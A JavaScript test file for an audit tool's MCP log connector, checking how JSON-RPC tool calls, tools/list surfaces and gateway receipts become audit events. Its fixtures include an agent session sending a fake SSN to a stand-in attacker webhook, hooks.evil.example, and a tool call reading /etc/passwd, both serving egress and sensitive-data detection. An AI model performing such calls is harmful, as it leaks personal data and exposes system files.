// P4 GAP-6 - MCP server log connector lock-in tests.
//
// Pins src/connectors/mcp.js: JSON-RPC tools/call traffic (request/result
// paired by id), tools/list declared tool surfaces, initialize serverInfo,
// kolm mcp-gateway receipts (mcp-tool-call-1/2/3), and the {server, entries[]}
// wrapper - all normalized to canonical AuditEvents with action.server set
// (the field the red-team mcp-discovery probe and model-provenance mcp_servers
// surface read). Plus: detection via the registry, end-to-end runAudit, and
// never-throws on garbage.
//
// Run: node --test tests/connector-mcp.test.js

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { runAudit } from '../src/audit-orchestrator.js';
import * as mcp from '../src/connectors/mcp.js';
import { detectConnector, normalizeWith, normalizeAuto, SOURCES } from '../src/connectors/index.js';

/* --------------------------- representative fixtures --------------------------- */

// A JSON-RPC session: initialize handshake, tools/list (declared surface),
// then two tools/call request/result pairs - one of which posts PII to an
// external webhook (the canonical deal-blocking action).
const MCP_JSONRPC = [
  { jsonrpc: '2.0', id: 0, method: 'initialize', params: { protocolVersion: '2025-03-26', clientInfo: { name: 'support-agent', version: '1.2.0' } } },
  { jsonrpc: '2.0', id: 0, result: { protocolVersion: '2025-03-26', serverInfo: { name: 'crm-server', version: '0.4.1' }, capabilities: { tools: {} } } },
  { jsonrpc: '2.0', id: 1, method: 'tools/list', params: {} },
  { jsonrpc: '2.0', id: 1, result: { tools: [{ name: 'get_customer', description: 'read' }, { name: 'send_webhook', description: 'post' }] } },
  { jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'get_customer', arguments: { customer_id: 'c-77' } }, session_id: 'sess-9' },
  { jsonrpc: '2.0', id: 2, result: { content: [{ type: 'text', text: 'Maria Field, maria@example.com, SSN 401-55-9823' }], isError: false } },
  { jsonrpc: '2.0', id: 3, method: 'tools/call', params: { name: 'send_webhook', arguments: { url: 'https://hooks.evil.example/x', body: 'SSN 401-55-9823' } }, session_id: 'sess-9' },
  { jsonrpc: '2.0', id: 3, result: { content: [{ type: 'text', text: 'delivered' }], isError: false } },
];

// kolm's own mcp-gateway receipt shape (src/mcp-gateway.js, mcp-tool-call-3;
// legacy mcp-tool-call-1/2 remains accepted).
const MCP_RECEIPT = {
  schema: 'mcp-tool-call-3',
  call_id: 'mtc_01JTESTRECEIPT0000000000',
  timestamp: '2026-06-11T10:00:00.000Z',
  tenant_id: 'tn_acme',
  tool: 'Send_Email',
  args_hash: 'a'.repeat(64),
  result_hash: 'b'.repeat(64),
  is_error: false,
  transport: 'http',
  server_id: 'mail-server',
  caller_agent_hash: 'sha256:' + 'c'.repeat(64),
  mcp_session_hash: 'sha256:' + 'd'.repeat(64),
  upstream_response_hash: 'sha256:' + 'e'.repeat(64),
};

/* ----------------------------------- tests ------------------------------------ */

test('mcp: request/result pair -> one tool event with action.server set', () => {
  const events = mcp.normalize(MCP_JSONRPC);
  const calls = events.filter((e) => e.meta.kind === 'tool_call');
  assert.equal(calls.length, 2, 'one event per tools/call pair (not per row)');

  const read = calls.find((e) => e.action.tool === 'get_customer');
  assert.ok(read, 'get_customer call present');
  assert.equal(read.action.type, 'tool');
  assert.equal(read.action.server, 'crm-server', 'server name from initialize serverInfo - the load-bearing field');
  assert.equal(read.data.has_sensitive, true, 'PII in the paired result text is scanned');
  assert.equal(read.actor.key_id, 'sess-9', 'session id lands as the credential identifier');
  assert.equal(read.actor.agent, 'support-agent', 'clientInfo.name lands as the agent');
  assert.equal(read.meta.source, 'mcp');
  assert.equal(read.meta.request_id, '2', 'JSON-RPC id retained for pairing evidence');
  assert.equal(read.meta.mcp_version, '2025-03-26');
  assert.equal(read.meta.server_version, '0.4.1', 'unpinned server version visible to provenance via meta');

  const hook = calls.find((e) => e.action.tool === 'send_webhook');
  assert.ok(hook, 'send_webhook call present');
  assert.equal(hook.action.host, 'hooks.evil.example', 'egress host derived from URL-bearing arguments');
  assert.equal(hook.data.egress, true);
  assert.equal(hook.data.has_sensitive, true);
});

test('mcp: tools/list -> granted scopes on calls + a discovery event', () => {
  const events = mcp.normalize(MCP_JSONRPC);

  // The declared surface lands as granted scopes on subsequent calls.
  const call = events.find((e) => e.action.tool === 'get_customer');
  assert.deepEqual(call.scopes.granted, ['tool:get_customer', 'tool:send_webhook'], 'tools/list names become tool:<name> grants');
  assert.deepEqual(call.scopes.used, ['tool:get_customer']);

  // tools/list itself is a discovery-verb tool event (list_tools), so the
  // red-team mcp-discovery probe is exercised, not untested.
  const disc = events.find((e) => e.meta.kind === 'discovery');
  assert.ok(disc, 'tools/list emits a discovery event');
  assert.equal(disc.action.tool, 'list_tools');
  assert.equal(disc.action.server, 'crm-server');

  // runAudit over the events makes the mcp-discovery probe report, not skip.
  const r = runAudit(events, { source: 'mcp' });
  assert.ok(r.ingest.events > 0, 'events ingest end to end');
  const probe = r.red_team.probes.find((p) => p.id === 'mcp-discovery');
  assert.ok(probe, 'mcp-discovery probe present');
  assert.notEqual(probe.status, 'untested', 'an MCP log exercises the mcp-discovery probe');
  assert.equal(probe.status, 'exposed', 'tool-surface enumeration (list_tools) is the discovery signal');
});

test('mcp: gateway receipt shape (mcp-tool-call-3) is absorbed', () => {
  const events = mcp.normalize([MCP_RECEIPT]);
  assert.equal(events.length, 1);
  const ev = events[0];
  assert.equal(ev.action.type, 'tool');
  assert.equal(ev.action.tool, 'send_email', 'tool lowercased');
  assert.equal(ev.action.server, 'mail-server', 'server_id lands as action.server');
  assert.equal(ev.ts, '2026-06-11T10:00:00.000Z');
  assert.equal(ev.id, 'mtc_01JTESTRECEIPT0000000000', 'call_id is the stable event id');
  assert.equal(ev.meta.tenant_id, 'tn_acme');
  assert.equal(ev.meta.transport, 'http');
  assert.equal(ev.meta.is_error, false);
  assert.equal(ev.data.has_sensitive, false, 'hash-only receipt carries no scannable content');

  // The legacy receipt_version field name and v1 schema are tolerated too.
  const alt = { ...MCP_RECEIPT };
  delete alt.schema;
  alt.receipt_version = 'mcp-tool-call-1';
  const evAlt = mcp.normalize([alt]);
  assert.equal(evAlt.length, 1);
  assert.equal(evAlt[0].action.tool, 'send_email');

  const v2 = { ...MCP_RECEIPT, schema: 'mcp-tool-call-2' };
  const evV2 = mcp.normalize([v2]);
  assert.equal(evV2.length, 1);
  assert.equal(evV2[0].action.tool, 'send_email');
});

test('mcp: generic {server, entries[]} wrapper and JSONL strings normalize', () => {
  const wrapped = { server: 'files-server', entries: [
    { jsonrpc: '2.0', id: 7, method: 'tools/call', params: { name: 'read_file', arguments: { path: '/etc/passwd' } } },
    { jsonrpc: '2.0', id: 7, result: { content: [{ type: 'text', text: 'root:x:0:0' }] } },
  ] };
  const events = mcp.normalize(wrapped);
  assert.equal(events.length, 1);
  assert.equal(events[0].action.tool, 'read_file');
  assert.equal(events[0].action.server, 'files-server', 'wrapper server name used when no initialize is present');

  const jsonl = MCP_JSONRPC.map((r) => JSON.stringify(r)).join('\n');
  const fromJsonl = mcp.normalize(jsonl);
  assert.equal(fromJsonl.filter((e) => e.meta.kind === 'tool_call').length, 2, 'JSONL parses identically');
});

test('mcp: unpaired tools/call request still emits its event', () => {
  const events = mcp.normalize([
    { jsonrpc: '2.0', id: 11, method: 'tools/call', params: { name: 'delete_record', arguments: { record_id: 'r1' } } },
  ]);
  assert.equal(events.length, 1);
  assert.equal(events[0].action.tool, 'delete_record');
  assert.equal(events[0].meta.request_id, '11');
});

test('mcp: detection - registry picks mcp, not otel/langsmith', () => {
  assert.ok(SOURCES.includes('mcp'), 'mcp is registered');
  assert.equal(detectConnector(MCP_JSONRPC), 'mcp');
  assert.equal(detectConnector([MCP_RECEIPT]), 'mcp');
  assert.equal(detectConnector({ server: 's', entries: MCP_JSONRPC }), 'mcp');
  assert.equal(detectConnector(MCP_JSONRPC.map((r) => JSON.stringify(r)).join('\n')), 'mcp');
  const auto = normalizeAuto(MCP_JSONRPC);
  assert.equal(auto.source, 'mcp');
  assert.ok(auto.events.length >= 3, 'normalizeAuto routes to the mcp connector');
  assert.ok(normalizeWith('mcp', MCP_JSONRPC).length >= 3);
});

test('mcp: never throws and returns [] on garbage', () => {
  const garbage = [undefined, null, 42, true, '', 'not json', '{bad', '[1,2,', [], [null], [42], {}, { random: 1 }, [{ jsonrpc: '1.0' }], { jsonrpc: '2.0' }, [{ jsonrpc: '2.0', method: 'tools/call' }]];
  for (const g of garbage) {
    const out = mcp.normalize(g);
    assert.ok(Array.isArray(out), `normalize returns an array for ${JSON.stringify(g)}`);
  }
});
